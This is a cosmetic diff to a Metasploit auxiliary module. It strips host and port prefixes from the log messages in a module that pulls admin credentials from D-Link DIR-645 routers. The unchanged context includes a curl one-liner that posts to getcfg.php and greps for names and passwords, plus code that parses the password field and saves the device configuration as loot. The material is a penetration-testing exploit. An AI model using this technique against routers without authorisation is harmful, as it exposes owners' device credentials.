@@ -34,7 +34,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    vprint_status("#{rhost}:#{rport} - Trying to access the configuration of the device")
+    vprint_status("Trying to access the configuration of the device")
 
     # Curl request:
     # curl -d SERVICES=DEVICE.ACCOUNT http://192.168.178.200/getcfg.php | egrep "\<name|password"
@@ -54,11 +54,11 @@ class MetasploitModule < Msf::Auxiliary
     return if (res.code == 404)
 
     if res.body =~ %r{<password>(.*)</password>}
-      print_good("#{rhost}:#{rport} - credentials successfully extracted")
+      print_good("credentials successfully extracted")
 
       # store all details as loot -> there is some useful stuff in the response
       loot = store_loot('dlink.dir645.config', 'text/plain', rhost, res.body)
-      print_good("#{rhost}:#{rport} - Account details downloaded to: #{loot}")
+      print_good("Account details downloaded to: #{loot}")
 
       res.body.each_line do |line|
         if line =~ %r{<name>(.*)</name>}
@@ -94,6 +94,6 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
   rescue ::Rex::ConnectionError
-    vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
+    vprint_error("Failed to connect to the web server")
   end
 end
